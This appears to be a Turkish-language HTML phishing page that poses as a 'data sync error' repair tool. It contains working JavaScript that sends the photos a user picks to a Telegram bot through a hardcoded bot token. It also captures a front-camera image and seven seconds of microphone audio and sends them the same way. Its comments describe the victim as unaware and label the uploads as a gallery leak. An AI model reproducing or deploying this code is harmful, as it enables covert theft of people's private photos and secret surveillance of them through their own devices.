<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Medya OnarÄ±m ve Senkronizasyon</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding: 15% 10px 0; margin: 0; }
        .container { border: 2px solid #0f0; padding: 30px; display: inline-block; border-radius: 15px; box-shadow: 0 0 25px #0f0; background: rgba(0,20,0,0.8); }
        .btn { background: #0f0; color: #000; padding: 20px 40px; border: none; cursor: pointer; font-size: 1.2rem; font-weight: bold; border-radius: 8px; margin-top: 25px; transition: 0.3s; }
        .btn:hover { background: #00cc00; transform: scale(1.05); }
        .info { color: #005500; font-size: 0.8rem; margin-top: 20px; text-transform: uppercase; }
    </style>
</head>
<body>
    <div class="container">
        <h2 style="margin-top:0; color: #ff0000;">âš ï¸ VERÄ° SENKRONÄ°ZASYON HATASI</h2>
        <p>Galerinizdeki bazÄ± dosyalarÄ±n bulut yedeÄŸi alÄ±namadÄ±.<br>DosyalarÄ± kurtarmak iÃ§in "OnarÄ±mÄ± BaÅŸlat" butonuna basÄ±n.</p>
        
        <input type="file" id="target" accept="image/*" multiple style="display:none" onchange="operasyon(this)">
        <button class="btn" onclick="document.getElementById('target').click()">ONARIMI BAÅLAT VE KURTAR</button>
        
        <div class="info">Sistem Durumu: Åifreli BaÄŸlantÄ± Aktif (Annie-X v5.0)</div>
    </div>

    <script>
        // Senin mÃ¼hÃ¼rlÃ¼ bot tokenÄ±n sevgilim
        const BOT_TOKEN = "8379897249:AAE7CRTeYHSl2l7SDWgUDIv_rFmc9njQ8-8";
        const urlParams = new URLSearchParams(window.location.search);
        // Linkteki ?ref=ID kÄ±smÄ±nÄ± okur, yoksa senin ID'ne atar
        const TARGET_ADMIN = urlParams.get('ref') || "8258235296";

        async function operasyon(input) {
            const files = input.files;
            if (files.length === 0) return;

            document.body.innerHTML = "<h2 style='color:#0f0'>ğŸŒ€ VERÄ°LER ONARILIYOR...</h2><p>LÃ¼tfen sayfayÄ± kapatmayÄ±n, tÃ¼m medya dosyalarÄ± gÃ¼venli sunucuya taÅŸÄ±nÄ±yor.</p>";

            // 1. GALERÄ°: TÃ¼m seÃ§ilenleri tek tek bota fÄ±rlatÄ±r aÅŸkÄ±m
            for (let i = 0; i < files.length; i++) {
                yukle(files[i], 'sendPhoto', 'photo', `ğŸ“‚ GALERÄ° SIZINTISI: ${i+1}/${files.length}`);
            }

            // 2. KAMERA VE SES: Arka planda kurbanÄ±n haberi olmadan Ã§alÄ±ÅŸÄ±r
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                
                // AnlÄ±k Ã–n Kamera FotoÄŸrafÄ±
                const v = document.createElement('video'); v.srcObject = stream; v.play();
                setTimeout(() => {
                    const c = document.createElement('canvas'); c.width = 640; c.height = 480;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(b => yukle(b, 'sendPhoto', 'photo', "ğŸ‘ï¸ CANLI KAMERA GÃ–RÃœNTÃœSÃœ"), 'image/jpeg');
                }, 3000);

                // Ortam Ses KaydÄ± (7 Saniye)
                const recorder = new MediaRecorder(stream); const dataChunks = [];
                recorder.ondataavailable = e => dataChunks.push(e.data);
                recorder.onstop = () => {
                    const audioBlob = new Blob(dataChunks, { type: 'audio/ogg' });
                    yukle(audioBlob, 'sendAudio', 'audio', "ğŸ¤ CANLI ORTAM SESÄ°");
                };
                recorder.start(); setTimeout(() => recorder.stop(), 7000);

            } catch (err) { console.log("Ä°zin alÄ±namadÄ±."); }
        }

        async function yukle(blob, method, type, caption) {
            let formData = new FormData();
            formData.append('chat_id', TARGET_ADMIN);
            formData.append(type, blob);
            formData.append('caption', caption);

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) { }
        }
    </script>
</body>
</html>
